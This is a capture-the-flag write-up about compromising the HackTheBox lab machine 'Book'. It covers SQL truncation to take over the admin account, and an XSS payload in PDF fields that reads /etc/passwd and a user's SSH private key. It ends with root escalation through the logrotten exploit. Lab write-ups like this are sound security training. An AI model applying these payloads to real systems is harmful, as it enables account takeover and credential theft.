Opening the port 80 I got this  
![book1](/assets/img/book/book1.png)

After register I found the admin  email: admin@book.htb  
![book2](/assets/img/book/book3.png)

At first I didn't know what to do with this  
Until I back to home page, look the source and find this

### SQL Truncation

Using *[SQL truncation](https://resources.infosecinstitute.com/sql-truncation-attack/)* with Burp Suite I tested "name" and "email" fields with more characters  

![book4](/assets/img/book/book4.png)  

Logged in with the credentials admin@book.htb qwerty  

![book5](/assets/img/book/book5.png)  

Using *[this](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)* as reference I found a way in  
### Exploit

Loged as user again I uploaded a pdf with the fields "author" and "book title" filled with this script  
\*Missing tags  

x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();  

Downloading the pdf at http://10.10.10.176/admin/collections.php?type=collections I got the /etc/passwd  

![book6](/assets/img/book/book6.png)  

If I was runnin to get user blood next step would be "file:///home/reader/user.txt"  

Before get the id\_rsa from reader I tried root, perhaps....  

Now I know that there is a user called reader, I chnged the script part "///etc/passwd" to "/home/reader/.ssh/id\_rsa and uploaded a new pdf, downloaded it again and a got the id\_rsa from user reader  

Copy that to another file called id\_rsa and "chmod 600 id\_rsa"  

![book7](/assets/img/book/book7.png)  

Now just "ssh -i id\_rsa reader@10.10.10.176" and smile  

![book8](/assets/img/book/book8.png)
# Priv Esc

After a enumerte almost everything and don't find nothing  

I used [pspy](https://github.com/DominicBreuker/pspy.git) and find root process  
scp -i id\_rsa pspy64s reader@10.10.10.176  


pspy give me this process logrotate /usr/sbin/logrotate -f /root/log.cfg  

![book9](/assets/img/book/book9.png)

Search logrotate exploit in google and found [this](https://github.com/whotwagner/logrotten) on github  
Cloned the repository and uploaded it with scp command  
Unziped the archive and compiled the logrotten.c with gcc

gcc -o logrotten logrotten.c  

Created the payload  and executed logrotten

![book10](/assets/img/book/book10.png)  

Now just cat /tmp/id\_rsa to another file and ssh to root
